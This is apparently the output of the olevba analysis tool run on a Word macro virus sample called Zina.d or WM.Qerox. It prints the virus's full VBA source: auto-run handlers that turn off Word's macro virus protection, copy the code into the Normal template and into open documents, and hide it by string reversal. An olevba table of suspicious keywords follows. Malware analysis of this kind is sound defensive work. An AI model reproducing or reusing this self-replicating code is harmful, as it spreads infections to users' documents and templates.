olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zina.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zina.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'String2K
Dim a23489245, b23489234, c76394729, d39848275, e72945601, f92038476
Dim g50385723, h84729645, i84729645, j40395423, k02391836, l20654583, m29387656
Dim n74359023, o09324687, p98734985, r90809564
Private Sub Document_Open()
'etalpmeTlamroN.noitacilppA = 43298432b teS :tnemucoDevitcA.noitacilppA = 54298432a teS
')57284893d - 57284893d( = noitcetorPsuriV.snoitpO :1 = 57284893d :tnemucoDsihT = 92749367c teS
'eludoMedoC.)57284893d(stnenopmocbv.tcejorPBV.43298432b = 63819320k teS
'eludoMedoC.)57284893d(stnenopmocbv.tcejorPBV.54298432a = 32095347n teS
'_ ,57284893d(seniL.eludoMedoC.)57284893d(stnenopmocbv.tcejorPBV.92749367c = 10654927e
')senilfotnuoc.eludoMedoC.)57284893d(stnenopmocbv.tcejorPBV.92749367c
'nehT "K2gnirtS'" >< )57284893d ,57284893d(seniL.63819320k fI
'senilfotnuoc.63819320k ,57284893d senileteled.63819320k
'10654927e gnirtsmorfdda.63819320k
'fI dnE
'nehT "K2gnirtS'" >< )57284893d ,57284893d(seniL.32095347n fI
'senilfotnuoc.32095347n ,57284893d senileteled.32095347n
'10654927e gnirtsmorfdda.32095347n
'fI dnE
End Sub
Private Sub document_close(): h84729645 = "'": d39848275 = 1: Dim a23, b34
If Left(ThisDocument.VBProject.vbcomponents(d39848275).CodeModule.Lines(17, d39848275), d39848275) = h84729645 Then
For j40395423 = 6 To 19
m29387656 = Right(ThisDocument.VBProject.vbcomponents(d39848275).CodeModule.Lines(j40395423, d39848275), Len(ThisDocument.VBProject.vbcomponents(d39848275).CodeModule.Lines(j40395423, d39848275)) - d39848275)
ThisDocument.VBProject.vbcomponents(d39848275).CodeModule.replaceline j40395423, m29387656
Next
For o09324687 = 6 To 19
p98734985 = ThisDocument.VBProject.vbcomponents(d39848275).CodeModule.Lines(o09324687, d39848275)
r90809564 = StrReverse(p98734985): ThisDocument.VBProject.vbcomponents(d39848275).CodeModule.replaceline o09324687, r90809564: r90809564 = ""
Next
End If
Document_Open
If Left(ThisDocument.VBProject.vbcomponents(d39848275).CodeModule.Lines(d39848275 + 6, d39848275), d39848275) <> h84729645 Then
For g50385723 = 6 To 19:  i84729645 = ThisDocument.VBProject.vbcomponents(d39848275).CodeModule.Lines(g50385723, d39848275)
l20654583 = StrReverse(i84729645)
ThisDocument.VBProject.vbcomponents(d39848275).CodeModule.replaceline g50385723, h84729645 & l20654583
l20654583 = ""
Next
End If
End Sub
'Virus Name: WM.Qerox
'Author Name: Specie
'SRME v1.0 by Specie [String Reverse Mutation Engine]





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|P8W#                |50385723                                     |
|Hex String|@9T#                |40395423                                     |
|Hex String|)8vV                |29387656                                     |
|Hex String|2       SG          |32095347                                     |
+----------+--------------------+---------------------------------------------+

